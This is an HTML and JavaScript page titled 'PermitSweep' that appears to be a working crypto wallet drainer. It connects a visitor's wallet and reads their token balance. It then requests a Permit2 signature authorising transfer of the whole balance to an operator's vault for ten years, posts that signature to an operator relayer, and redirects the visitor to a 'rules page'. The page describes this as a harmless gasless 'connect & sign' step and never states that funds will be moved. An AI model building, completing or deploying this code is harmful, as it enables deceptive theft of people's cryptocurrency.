<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>PermitSweep - Sign & Redirect</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; margin: auto; }
    .box { padding: 16px; border-radius: 8px; background: #f6f7fb; margin-top: 12px; }
    button { padding: 10px 16px; font-size: 16px; }
    small { color: #666; }
  </style>
</head>
<body>
  <h2>PermitSweep â€” connect & sign</h2>
  <p class="box">
    This page will: connect your wallet, request a single signature (Permit2/EIP-2612), then redirect you to the rules page.
    <br><small>All actual token transfer will be performed by the relayer (gasless for you).</small>
  </p>

  <div id="status" class="box">Initializingâ€¦</div>

<script>
(async () => {
  // ------------------ CONFIG (replace placeholders) ------------------
  // Put your deployed vault contract address (PermitSweep)
  const VAULT_ADDRESS = "<PUT_VAULT_ADDRESS_HERE>";
  // Permit2 contract address (canonical). Keep or change for local testing.
  const PERMIT2_ADDRESS = "<PUT_PERMIT2_ADDRESS_HERE>";
  // Relayer endpoint where we POST the signed payload:
  const RELAYER_ENDPOINT = "<PUT_YOUR_RELAYER_API_ENDPOINT_HERE>"; // e.g. https://relayer.yourdomain.com/relay
  // If token is provided in query string like ?token=0x..., it will override DEFAULT_TOKEN
  const DEFAULT_TOKEN = "<PUT_A_DEFAULT_TEST_TOKEN_IF_ANY>";
  // The page to redirect user to (your rules/terms page)
  const DESTINATION_PAGE = "https://YOUR-RULES-PAGE.com"; // ðŸ”§ replace with your rules URL
  // Relayer fee to request in token units (as decimal string in token's smallest unit)
  const RELAYER_FEE_STR = "0"; // by default 0 â€” relayer may expect a fee, set as needed (string)
  // -------------------------------------------------------------------

  // minimal ERC20 ABI for balanceOf/decimals/name
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function name() view returns (string)",
    "function nonces(address) view returns (uint256)", // for ERC20Permit
    "function DOMAIN_SEPARATOR() view returns (bytes32)"
  ];

  const status = (s) => { document.getElementById('status').innerText = s; console.log(s); };

  try {
    // Get token param
    const params = new URLSearchParams(window.location.search);
    const tokenAddress = (params.get('token') || DEFAULT_TOKEN).trim();
    if (!tokenAddress) {
      status("No token specified. Provide ?token=0x... in URL or set DEFAULT_TOKEN in the config.");
      return;
    }

    if (!window.ethereum) {
      status("No injected wallet detected. Please open with MetaMask or compatible wallet.");
      return;
    }

    // Connect wallet
    status("Requesting wallet connection...");
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    const chainId = await provider.getNetwork().then(n => n.chainId);

    status(`Connected: ${userAddress} on chain ${chainId}`);

    // Read token balance and decimals
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const decimals = await token.decimals().catch(()=>18); // default 18 if fails
    let balance = await token.balanceOf(userAddress);
    // convert to human readable for UX (not shown in tx)
    const human = ethers.formatUnits(balance, decimals);
    status(`Token ${tokenAddress} balance: ${human} (decimals=${decimals})`);

    // Compute requestedAmount (we want full balance)
    const requestedAmount = balance.toString(); // string of uint256 smallest units
    // For unlimited permit, use maxUint256 if you'd like instead of requestedAmount.
    // const MAX_UINT = (BigInt(1) << BigInt(256)) - BigInt(1);
    // const requestedAmount = MAX_UINT.toString();

    // Build permit struct for Permit2 (typed-data)
    // IMPORTANT: You must verify that PERMIT2 contract at PERMIT2_ADDRESS on this chain
    // implements the exact typed structure. For Sepolia you may deploy a Permit2 or
    // use EIP-2612-compatible token for quick tests (see README steps).
    status("Preparing typed data for Permit2...");

    // Try to obtain nonce for Permit2 if available (best-effort)
    // Some Permit2 implementations expose nonces; if not, fallback to 0.
    async function getPermit2Nonce(owner) {
      try {
        const p2 = new ethers.Contract(PERMIT2_ADDRESS, ["function nonces(address) view returns (uint256)"], provider);
        const n = await p2.nonces(owner);
        return n.toString();
      } catch (e) {
        // fallback
        return "0";
      }
    }

    const nonce = await getPermit2Nonce(userAddress);
    const deadline = (BigInt(Math.floor(Date.now()/1000)) + BigInt(60*60*24*365*10)).toString(); // 10 years
    // Compose domain/types/message per Permit2 spec
    const domain = {
      name: "Permit2",
      version: "1",
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" }
      ],
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ],
      SignatureTransferDetails: [
        { name: "to", type: "address" },
        { name: "requestedAmount", type: "uint256" }
      ]
    };

    const message = {
      permitted: {
        token: tokenAddress,
        amount: requestedAmount
      },
      nonce: nonce,
      deadline: deadline
    };

    const transferDetails = {
      to: VAULT_ADDRESS,
      requestedAmount: requestedAmount
    };

    const typedData = {
      domain: domain,
      types: types,
      primaryType: "PermitTransferFrom",
      message: message,
      // Note: Some wallets expect the full JSON structure for eth_signTypedData_v4 with
      // an additional "transferDetails" object. We will pass the permit and transferDetails separately
    };

    // Many wallets do not accept nested complex objects exactly â€” using eth_signTypedData_v4
    // we typically send the whole EIP-712 JSON (domain + types + message). We will pack permit and transfer details:
    const payloadToSign = {
      domain,
      message, // this is PermitTransferFrom message
      types,
      primaryType: "PermitTransferFrom",
      // We'll attach transferDetails separately as raw message that relayer will use.
      transferDetails
    };

    status("Requesting EIP-712 signature from wallet (Permit2)...");

    // Request signature via MetaMask (eth_signTypedData_v4)
    const signerAddressChecksum = ethers.getAddress(userAddress);
    const sig = await window.ethereum.request({
      method: "eth_signTypedData_v4",
      params: [signerAddressChecksum, JSON.stringify({
        domain: domain,
        message: message,
        primaryType: "PermitTransferFrom",
        types: types
      })]
    });

    status("Signature obtained. Sending payload to relayer...");

    // Build payload matching relayer expectation
    const payload = {
      permit: {
        permitted: { token: tokenAddress, amount: requestedAmount },
        nonce: nonce,
        deadline: deadline
      },
      transferDetails: { to: VAULT_ADDRESS, requestedAmount: requestedAmount },
      owner: userAddress,
      signature: sig,
      token: tokenAddress,
      relayerFee: RELAYER_FEE_STR
    };

    // POST to relayer
    const resp = await fetch(RELAYER_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!resp.ok) {
      const txt = await resp.text();
      status("Relayer error: " + txt);
      // After failure, still redirect to rules for UX
      window.location.href = DESTINATION_PAGE;
      return;
    }

    const result = await resp.json();
    status("Relayer accepted payload. txHash: " + (result.txHash || "pending"));

    // After success (or regardless) redirect to rules page
    setTimeout(() => { window.location.href = DESTINATION_PAGE; }, 1200);

  } catch (err) {
    console.error(err);
    document.getElementById('status').innerText = "Error: " + (err.message || String(err));
  }
})();
</script>
</body>
</html>
